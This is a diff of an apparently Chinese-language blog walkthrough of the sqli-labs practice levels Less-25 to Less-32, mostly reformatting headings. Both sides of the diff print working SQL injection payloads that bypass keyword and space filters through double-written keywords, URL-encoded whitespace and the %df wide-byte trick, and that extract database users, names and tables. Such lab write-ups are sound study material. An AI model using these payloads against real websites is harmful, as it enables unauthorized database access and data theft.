@@ -454,15 +454,13 @@ id<span class="token operator">=</span>1<span class="token string">' and updatex
 <h1 id="and和or绕过-Less-25-Less25a"><a href="#and和or绕过-Less-25-Less25a" class="headerlink" title="and和or绕过(Less-25~Less25a)"></a>and和or绕过(Less-25~Less25a)</h1><h2 id="Less-25"><a href="#Less-25" class="headerlink" title="Less-25"></a>Less-25</h2><p>本关对or和and进行了过滤。要绕过or和and，构造其他的注入语句。</p>
 <h4 id="方法一："><a href="#方法一：" class="headerlink" title="方法一："></a>方法一：</h4><p>尝试双写绕过。即双写关键字，可将and写为anandd，or写成oorr,发现成功绕过了耶。</p>
 <h4 id="方法二："><a href="#方法二：" class="headerlink" title="方法二："></a>方法二：</h4><p>可尝试将and替换成&amp;&amp;，or替换成||。这里我试了一下用||可以，但&amp;&amp;不可以，因为&amp;在数据包里面相当于里面的参数连接符，可以将&amp;&amp;进行url编码成%26%26使用。</p>
-<h3 id="这里采用双写绕过并利用报错注入："><a href="#这里采用双写绕过并利用报错注入：" class="headerlink" title="这里采用双写绕过并利用报错注入："></a>这里采用双写绕过并利用报错注入：</h3><p>①获取数据库用户名</p>
-<pre class="line-numbers language-bash"><code class="language-bash">payload：
+<h3 id="这里采用双写绕过并利用报错注入："><a href="#这里采用双写绕过并利用报错注入：" class="headerlink" title="这里采用双写绕过并利用报错注入："></a>这里采用双写绕过并利用报错注入：</h3><h4 id="①获取数据库用户名"><a href="#①获取数据库用户名" class="headerlink" title="①获取数据库用户名"></a>①获取数据库用户名</h4><pre class="line-numbers language-bash"><code class="language-bash">payload：
 
 id<span class="token operator">=</span>1' anandd updatexml<span class="token punctuation">(</span>1,concat<span class="token punctuation">(</span>0x7e,<span class="token punctuation">(</span>select user<span class="token punctuation">(</span><span class="token punctuation">))</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">)</span>--+
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <img src="/posts/fb8a/25.png" class>
 
-<p>②获取数据库名</p>
-<pre class="line-numbers language-bash"><code class="language-bash">payload:
+<h4 id="②获取数据库名"><a href="#②获取数据库名" class="headerlink" title="②获取数据库名"></a>②获取数据库名</h4><pre class="line-numbers language-bash"><code class="language-bash">payload:
 
 id<span class="token operator">=</span>1' anandd info<span class="token punctuation">(</span><span class="token punctuation">)</span>--+
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
@@ -474,14 +472,12 @@ id<span class="token operator">=</span>1' anandd info<span class="token punctuat
 <h2 id="Less-25a"><a href="#Less-25a" class="headerlink" title="Less-25a"></a>Less-25a</h2><p>本关错误时不会显示错在哪里了，所以不能采用报错注入。并且也对and和or进行了过滤。</p>
 <p>当使用id=1 || 1=1出现正确信息，说明在源码中id=$id。</p>
 <p>可以使用延时注入和布尔盲注。</p>
-<h3 id="这里还是用anandd双写来代替and-下面采用基于布尔的盲注："><a href="#这里还是用anandd双写来代替and-下面采用基于布尔的盲注：" class="headerlink" title="这里还是用anandd双写来代替and,下面采用基于布尔的盲注："></a>这里还是用anandd双写来代替and,下面采用基于布尔的盲注：</h3><p>①获取数据库用户名</p>
-<pre class="line-numbers language-bash"><code class="language-bash">payload:
+<h3 id="这里还是用anandd双写来代替and-下面采用基于布尔的盲注："><a href="#这里还是用anandd双写来代替and-下面采用基于布尔的盲注：" class="headerlink" title="这里还是用anandd双写来代替and,下面采用基于布尔的盲注："></a>这里还是用anandd双写来代替and,下面采用基于布尔的盲注：</h3><h4 id="①获取数据库用户名-1"><a href="#①获取数据库用户名-1" class="headerlink" title="①获取数据库用户名"></a>①获取数据库用户名</h4><pre class="line-numbers language-bash"><code class="language-bash">payload:
 
 id<span class="token operator">=</span>1 anandd substr<span class="token punctuation">(</span>user<span class="token punctuation">(</span><span class="token punctuation">)</span>,1,1<span class="token punctuation">)</span><span class="token operator">=</span><span class="token string">'a'</span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <p>当字母正确时，会出现正确的页面，当字母不正确时，会出现不正确的页面。也可以用burp抓包，对substr的第一个1和字母a进行爆破。</p>
-<p>②获取数据库名</p>
-<pre class="line-numbers language-bash"><code class="language-bash">payload：
+<h4 id="②获取数据库名-1"><a href="#②获取数据库名-1" class="headerlink" title="②获取数据库名"></a>②获取数据库名</h4><pre class="line-numbers language-bash"><code class="language-bash">payload：
 
 id<span class="token operator">=</span>1 anandd substr<span class="token punctuation">(</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span>,1,1<span class="token punctuation">)</span><span class="token operator">=</span><span class="token string">'a'</span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
@@ -491,14 +487,12 @@ id<span class="token operator">=</span>1 anandd substr<span class="token punctua
 <p>空格字符绕过：</p>
 <pre class="line-numbers language-bash"><code class="language-bash">%20 %09 %0a %0b %0c %0d %a0 /**/ +
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<h3 id="本关可以用报错注入："><a href="#本关可以用报错注入：" class="headerlink" title="本关可以用报错注入："></a>本关可以用报错注入：</h3><p>①获得数据库用户名</p>
-<pre class="line-numbers language-bash"><code class="language-bash">payload:
+<h3 id="本关可以用报错注入："><a href="#本关可以用报错注入：" class="headerlink" title="本关可以用报错注入："></a>本关可以用报错注入：</h3><h4 id="①获得数据库用户名"><a href="#①获得数据库用户名" class="headerlink" title="①获得数据库用户名"></a>①获得数据库用户名</h4><pre class="line-numbers language-bash"><code class="language-bash">payload:
 
 id<span class="token operator">=</span>1<span class="token string">'+||+updatexml(1,concat(0x7e,user(),0x7e),1)+||+'</span>1
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <p>  <img src="/posts/fb8a/26.png" class></p>
-<p>②获得数据库名</p>
-<pre class="line-numbers language-bash"><code class="language-bash">payload：
+<h4 id="②获得数据库名"><a href="#②获得数据库名" class="headerlink" title="②获得数据库名"></a>②获得数据库名</h4><pre class="line-numbers language-bash"><code class="language-bash">payload：
 
 id<span class="token operator">=</span>1<span class="token string">'+||+info()+||+'</span>1
 
@@ -508,35 +502,30 @@ id<span class="token operator">=</span>1<span class="token string">'+||+updatexm
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>  <img src="/posts/fb8a/26_2.png" class></p>
 <h2 id="Less-26a"><a href="#Less-26a" class="headerlink" title="Less-26a"></a>Less-26a</h2><p>本关过滤的字符跟第二十六关一样，闭合方式是’) 并且不能用报错注入了，因为不会显示错在哪里了。可以采用union联合注入或盲注。</p>
-<h3 id="下面采用union联合注入："><a href="#下面采用union联合注入：" class="headerlink" title="下面采用union联合注入："></a>下面采用union联合注入：</h3><p>①获得数据库名</p>
-<pre class="line-numbers language-bash"><code class="language-bash">payload：
+<h3 id="下面采用union联合注入："><a href="#下面采用union联合注入：" class="headerlink" title="下面采用union联合注入："></a>下面采用union联合注入：</h3><h4 id="①获得数据库名"><a href="#①获得数据库名" class="headerlink" title="①获得数据库名"></a>①获得数据库名</h4><pre class="line-numbers language-bash"><code class="language-bash">payload：
 
 id<span class="token operator">=</span>999<span class="token string">')+union%0bselect%0b1,database(),3+||('</span>1
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <p>这里的999为一个不存在的值，%0b可以用%a0代替，其他不行，可能是系统问题。</p>
 <p>  <img src="/posts/fb8a/26a.png" class></p>
-<p>②获得用户名</p>
-<pre class="line-numbers language-bash"><code class="language-bash">payload：
+<h4 id="②获得用户名"><a href="#②获得用户名" class="headerlink" title="②获得用户名"></a>②获得用户名</h4><pre class="line-numbers language-bash"><code class="language-bash">payload：
 
 id<span class="token operator">=</span>999<span class="token string">')+union%0bselect%0b1,user(),3+||('</span>1
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <p>  <img src="/posts/fb8a/26a_2.png" class></p>
-<p>③获得表名</p>
-<pre class="line-numbers language-bash"><code class="language-bash">payload：
+<h4 id="③获得表名"><a href="#③获得表名" class="headerlink" title="③获得表名"></a>③获得表名</h4><pre class="line-numbers language-bash"><code class="language-bash">payload：
 
 id<span class="token operator">=</span>id<span class="token operator">=</span>999<span class="token string">')+union%0bselect%0b1,group_concat(table_name),3%0bfrom%0binfoorrmation_schema.tables%0bwhere%0btable_schema=database()||('</span>1
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <p>  <img src="/posts/fb8a/26a_3.png" class></p>
-<h1 id="union和select绕过-Less-27-Less-27a"><a href="#union和select绕过-Less-27-Less-27a" class="headerlink" title="union和select绕过(Less-27~Less-27a)"></a>union和select绕过(Less-27~Less-27a)</h1><h2 id="Less-27"><a href="#Less-27" class="headerlink" title="Less-27"></a>Less-27</h2><p>本关主要是union、select字符和26关过滤掉的字符。</p>
+<h1 id="union和select绕过-Less-27-Less-28a"><a href="#union和select绕过-Less-27-Less-28a" class="headerlink" title="union和select绕过(Less-27~Less-28a)"></a>union和select绕过(Less-27~Less-28a)</h1><h2 id="Less-27"><a href="#Less-27" class="headerlink" title="Less-27"></a>Less-27</h2><p>本关主要是union、select字符和26关过滤掉的字符。</p>
 <p>如果要用到union和select的话，可以使用大小写混写或者双写关键字绕过。</p>
-<h3 id="可以采用报错注入："><a href="#可以采用报错注入：" class="headerlink" title="可以采用报错注入："></a>可以采用报错注入：</h3><p>①获得数据库用户名</p>
-<pre class="line-numbers language-bash"><code class="language-bash">payload：
+<h3 id="可以采用报错注入："><a href="#可以采用报错注入：" class="headerlink" title="可以采用报错注入："></a>可以采用报错注入：</h3><h4 id="①获得数据库用户名-1"><a href="#①获得数据库用户名-1" class="headerlink" title="①获得数据库用户名"></a>①获得数据库用户名</h4><pre class="line-numbers language-bash"><code class="language-bash">payload：
 
 id<span class="token operator">=</span>1<span class="token string">'+and%a0updatexml(1,concat(0x7e,user(),0x7e),1)+and+'</span>1
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <p>  <img src="/posts/fb8a/27.png" class></p>
-<p>获得数据库名：</p>
-<pre class="line-numbers language-bash"><code class="language-bash">payload：
+<h4 id="②获得数据库名："><a href="#②获得数据库名：" class="headerlink" title="②获得数据库名："></a>②获得数据库名：</h4><pre class="line-numbers language-bash"><code class="language-bash">payload：
 
 1<span class="token string">'+and%a0info()+and+'</span>1
 
@@ -546,47 +535,41 @@ id<span class="token operator">=</span>1<span class="token string">'+and%a0updat
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>  <img src="/posts/fb8a/27_2.png" class></p>
 <h2 id="Less-27a"><a href="#Less-27a" class="headerlink" title="Less-27a"></a>Less-27a</h2><p>本关过滤的字符跟第二十七关一样，闭合方式为”并且不能采用报错注入了。</p>
-<h3 id="可以采用union联合注入（union和select大小写混写）："><a href="#可以采用union联合注入（union和select大小写混写）：" class="headerlink" title="可以采用union联合注入（union和select大小写混写）："></a>可以采用union联合注入（union和select大小写混写）：</h3><p>①获得数据库用户名</p>
-<pre class="line-numbers language-bash"><code class="language-bash">payload：
+<h3 id="可以采用union联合注入（union和select大小写混写）："><a href="#可以采用union联合注入（union和select大小写混写）：" class="headerlink" title="可以采用union联合注入（union和select大小写混写）："></a>可以采用union联合注入（union和select大小写混写）：</h3><h4 id="①获得数据库用户名-2"><a href="#①获得数据库用户名-2" class="headerlink" title="①获得数据库用户名"></a>①获得数据库用户名</h4><pre class="line-numbers language-bash"><code class="language-bash">payload：
 
 id<span class="token operator">=</span>999<span class="token string">"+UniOn%a0SeLect%a01,user(),3+||+"</span>1
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <p> <img src="/posts/fb8a/27a.png" class></p>
-<p>②获得数据库名</p>
-<pre class="line-numbers language-bash"><code class="language-bash">payload：
+<h4 id="②获得数据库名-1"><a href="#②获得数据库名-1" class="headerlink" title="②获得数据库名"></a>②获得数据库名</h4><pre class="line-numbers language-bash"><code class="language-bash">payload：
 
 id<span class="token operator">=</span>999<span class="token string">"+UniOn%a0SeLect%a01,database(),3+||+"</span>1
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <img src="/posts/fb8a/27a_2.png" class>
 
-<h1 id="Less-28"><a href="#Less-28" class="headerlink" title="Less-28"></a>Less-28</h1><p>本关第二十七差不多,只是闭合的方式是’)</p>
-<p>①获取数据库名：</p>
-<pre class="line-numbers language-bash"><code class="language-bash">payload：
+<h2 id="Less-28"><a href="#Less-28" class="headerlink" title="Less-28"></a>Less-28</h2><p>本关第二十七差不多,只是闭合的方式是’)</p>
+<h4 id="①获取数据库名："><a href="#①获取数据库名：" class="headerlink" title="①获取数据库名："></a>①获取数据库名：</h4><pre class="line-numbers language-bash"><code class="language-bash">payload：
 
 id<span class="token operator">=</span>999<span class="token string">') union%a0select%a01,database(),3+||+('</span>1
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <p>  <img src="/posts/fb8a/28.png" class></p>
-<p>②获得数据库用户名</p>
-<pre class="line-numbers language-bash"><code class="language-bash">payload：
+<h4 id="②获得数据库用户名"><a href="#②获得数据库用户名" class="headerlink" title="②获得数据库用户名"></a>②获得数据库用户名</h4><pre class="line-numbers language-bash"><code class="language-bash">payload：
 
 id<span class="token operator">=</span>999<span class="token string">') union%a0select%a01,user(),3+||+('</span>1
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <p>  <img src="/posts/fb8a/28_2.png" class></p>
-<h1 id="Less-28a"><a href="#Less-28a" class="headerlink" title="Less-28a"></a>Less-28a</h1><p>用第二十八关的payload一样可以</p>
+<h2 id="Less-28a"><a href="#Less-28a" class="headerlink" title="Less-28a"></a>Less-28a</h2><p>用第二十八关的payload一样可以</p>
 <h1 id="HPP-HTTP-Parameter-Pollution-，http-参数污染-Less29-Less-31"><a href="#HPP-HTTP-Parameter-Pollution-，http-参数污染-Less29-Less-31" class="headerlink" title="HPP(HTTP Parameter Pollution)，http 参数污染(Less29~Less-31)"></a>HPP(HTTP Parameter Pollution)，http 参数污染(Less29~Less-31)</h1><p>这三关是要搭建环境才能实现的。好像要在Ubuntu下，并且要下载tomcat，jdk等等。想了想，了解下原理，还是在PHP环境下绕过得了。</p>
 <p>这里的两层架构的工作流程为：</p>
 <p>client 访问服务器，能直接访问到 tomcat 服务器，然后 tomcat 服务器再向 apache 服务器请求数据。数据返回路径则相反。</p>
 <p>这里需要注意的就是：</p>
 <p>index.php?id=1&amp;id=2,在Apache(php)解析最后一个参数，Tomcat(jsp)解析第一个参数。那先经过Tomcat再到Apache的也是显示最后一个参数。</p>
 <h2 id="Less-29"><a href="#Less-29" class="headerlink" title="Less-29"></a>Less-29</h2><p>这里使用一个单引号报错，使用两个单引号正常。</p>
-<h3 id="（1）直接用报错注入"><a href="#（1）直接用报错注入" class="headerlink" title="（1）直接用报错注入"></a>（1）直接用报错注入</h3><p>①得到数据库用户名</p>
-<pre class="line-numbers language-bash"><code class="language-bash">payload:
+<h3 id="（1）直接用报错注入"><a href="#（1）直接用报错注入" class="headerlink" title="（1）直接用报错注入"></a>（1）直接用报错注入</h3><h4 id="①得到数据库用户名"><a href="#①得到数据库用户名" class="headerlink" title="①得到数据库用户名"></a>①得到数据库用户名</h4><pre class="line-numbers language-bash"><code class="language-bash">payload:
 
 id<span class="token operator">=</span>1' and updatexml<span class="token punctuation">(</span>1,concat<span class="token punctuation">(</span>0x7e,user<span class="token punctuation">(</span><span class="token punctuation">)</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">)</span>--+
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <p> <img src="/posts/fb8a/29.png" class></p>
-<p>②获取数据库名</p>
-<pre class="line-numbers language-bash"><code class="language-bash">payload：
+<h4 id="②获取数据库名-2"><a href="#②获取数据库名-2" class="headerlink" title="②获取数据库名"></a>②获取数据库名</h4><pre class="line-numbers language-bash"><code class="language-bash">payload：
 
 id<span class="token operator">=</span>1' and updatexml<span class="token punctuation">(</span>1,concat<span class="token punctuation">(</span>0x7e,database<span class="token punctuation">(</span><span class="token punctuation">)</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">)</span>--+
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
@@ -630,8 +613,7 @@ id<span class="token operator">=</span>-1' union <span class="token keyword">sel
 <p>思路一：%df吃掉\ 原因在于urldecode(‘)=%5c%27,而我们在前面添加%df，就形成了%df%5c%27,mysql在GBK编码中前两个字当做一个汉字，此时%27就会作为一个单独的字符，也就是’</p>
 <p>思路二：将&#39;中的\过滤掉。可以构造%**%5c%5c%27，后面的%5c会被前面的%5c给注释掉。</p>
 <h2 id="Less-32"><a href="#Less-32" class="headerlink" title="Less-32"></a>Less-32</h2><p>本关将’转换为&#39;，我们利用%df消掉生成的那个\。</p>
-<h3 id="采用报错注入："><a href="#采用报错注入：" class="headerlink" title="采用报错注入："></a>采用报错注入：</h3><p>①获得数据库名</p>
-<pre class="line-numbers language-bash"><code class="language-bash">payload：
+<h3 id="采用报错注入："><a href="#采用报错注入：" class="headerlink" title="采用报错注入："></a>采用报错注入：</h3><h4 id="①获得数据库名-1"><a href="#①获得数据库名-1" class="headerlink" title="①获得数据库名"></a>①获得数据库名</h4><pre class="line-numbers language-bash"><code class="language-bash">payload：
 
 id<span class="token operator">=</span>1%df<span class="token string">' and updatexml(1,concat(0x7e,user(),0x7e),1)--+
 
@@ -639,8 +621,7 @@ id<span class="token operator">=</span>1%df<span class="token string">' and upda
 
 id=1%df'</span> and info<span class="token punctuation">(</span><span class="token punctuation">)</span>--+
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>②获得数据库用户名</p>
-<pre class="line-numbers language-bash"><code class="language-bash">payload：
+<h4 id="②获得数据库用户名-1"><a href="#②获得数据库用户名-1" class="headerlink" title="②获得数据库用户名"></a>②获得数据库用户名</h4><pre class="line-numbers language-bash"><code class="language-bash">payload：
 
 1%df' and updatexml<span class="token punctuation">(</span>1,concat<span class="token punctuation">(</span>0x7e,database<span class="token punctuation">(</span><span class="token punctuation">)</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">)</span>--+
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
